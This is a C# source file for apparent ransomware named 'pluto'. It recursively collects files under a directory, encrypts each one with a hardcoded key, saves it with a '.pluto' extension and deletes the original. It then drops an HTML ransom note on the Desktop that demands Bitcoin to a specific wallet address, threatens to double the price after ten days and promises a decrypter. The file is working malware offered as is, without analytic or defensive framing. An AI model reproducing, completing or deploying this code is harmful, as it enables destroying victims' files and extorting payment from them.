using BotCrypt;
using System;
using System.Collections.Generic;
using System.Diagnostics.Contracts;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace pluto
{
    internal class PlutoExecutor
    {
        readonly string _encryptionKey = "AD94E876-F679-4889-B425-120F19C9BEE4";
        private List<string> GetFiles(string dirPath)
        {
            _ = dirPath ?? throw new ArgumentException(nameof(dirPath));
            _ = dirPath is not "" ? dirPath : throw new ArgumentException(nameof(dirPath));


            List<string> validFiles = new();

            var options = new EnumerationOptions { IgnoreInaccessible = true, RecurseSubdirectories = true };
            var fileEnumerator = Directory.EnumerateFiles(dirPath, "*", options).Where(x => !x.EndsWith(".pluto")).GetEnumerator();
            while (true)
            {
                try
                {
                    if (fileEnumerator.MoveNext())
                    {
                        validFiles.Add(fileEnumerator.Current);
                    }
                    else
                    {
                        break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    return new List<string>();
                }
            }
            return validFiles;
        }

        async Task EncryptFiles(List<string> files)
        {
            await Parallel.ForEachAsync(files, async (file, _) =>
            {
                var cipherTextFile = $"{file}.pluto";

                byte[] FileBytes = await File.ReadAllBytesAsync(file, _);
                string Password = _encryptionKey;
                string EncryptedFile = Crypter.EncryptByte(Password, FileBytes);
                await File.WriteAllTextAsync(cipherTextFile, EncryptedFile, _);

                await using (new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.None, 4096, FileOptions.DeleteOnClose)) { }
            });
        }

        async public Task Run(string dirPath)
        {
            var files = GetFiles(dirPath);
            await EncryptFiles(files);

            var demand = @"
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Your files have been encrypted</title>
                        <style>
                            body {
                                background-color: black;
                                color: white;
                                font-family: sans-serif;
                            }

                            .main-div {
                                margin: auto;
                                display: block;
                                width: 80%;
                                float: initial;
                            }

                            .form-group {
                                width: 40%;
                                display: block;
                                margin: auto;
                            }

                            input {
                                width: 100%
                            }
                        </style>
                    </head>
                    <body>
                        <div class=""main-div bg-balck"">
                            <div class=""form-group"">
                                <b>Instructions to unlok your files/data</b>
                                <p>1. Download and install the Multibit application. This will give you your own Bitcoin-wallet address. You can find it under the ""Request"" tab. Paste this in the ""Your BTC-address"" field below.<br /><br />2. Buy Bitcoins, (check FILES_ENCRYPTED-READ_ME.HTML at bottom for correct amount, price is 500 $ / 1.20505158 BTC or 1000 $ / 2.41010315 BTC) and send it to your own Bitcoin-wallet address, they will show up in the Multibit app that you installed earlier. From there, hit the ""Send"" tab. Send the remaining BTC (bitcoin) to this Bitcoin-wallet address: 1GBvRuHKSssm18WUC9kLZNTg2cTZbmGNLS<br /><br />Now submit the form below, only if you've actually sent the Bitcoins. Upon manual verification of the transaction you will receive the decrypter through email within 12 hours. ALL of your files/data will then be unlocked and decrypted automatically, HTML ransom files will also be removed.<br />Do NOT remove HTML ransom files or try to temper files in any way, because decrypter will not work anymore.</p>
                                <p><br />Please remember this is the only way to ever regain access to your files again! If payment is not received within ten days (check FILES_ENCRYPTED-READ_ME.HTML for date) the price for the decrypter is doubled.</p>
                                <p><br />How do I know I can trust you? Please submit the form here and we will decrypt one file (up to 1MB) for you!</p>
                                </p>
                            </div>
                            <form action=""/"" method=""get"">
                                <div class=""form-group"">
                                    <label>Input the next hash below: 695300ee-3637-49fb-8817-d2e25e4166c4 </label> <br />
                                    <input type=""text"" name=""name"" />
                                </div>
                                <br />
                                <div class=""form-group"">
                                    <label>FIle</label> <br />
                                    <input type=""file"" name=""name"" />
                                </div>
                                <br />
                                <div class=""form-group"">
                                    <button type=""submit"">Send</button>
                                </div>
                            </form>
                        </div>
                    </body>
                    </html>
                    ";
            await WriteFile(demand);
        }

        //async Task<string> ReadFile()
        //{
        //    try
        //    {
        //        using (var sr = new StreamReader(System.IO.Path.Combine(Environment.CurrentDirectory, "template.html")))
        //        {
        //            var str = await sr.ReadToEndAsync();
        //            return str;
        //        }
        //    }
        //    catch (IOException e)
        //    {
        //        Console.WriteLine("The file could not be read:");
        //        Console.WriteLine(e.Message);
        //    }
        //    return "";
        //}

        async Task WriteFile(string fileContent)
        {
            string docPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop");
            try
            {
                using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "READ_2_ME.HTML")))
                {
                    await outputFile.WriteAsync(fileContent);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("The file could not be writed:");
                Console.WriteLine(e.Message);
            }
        }
    }
}
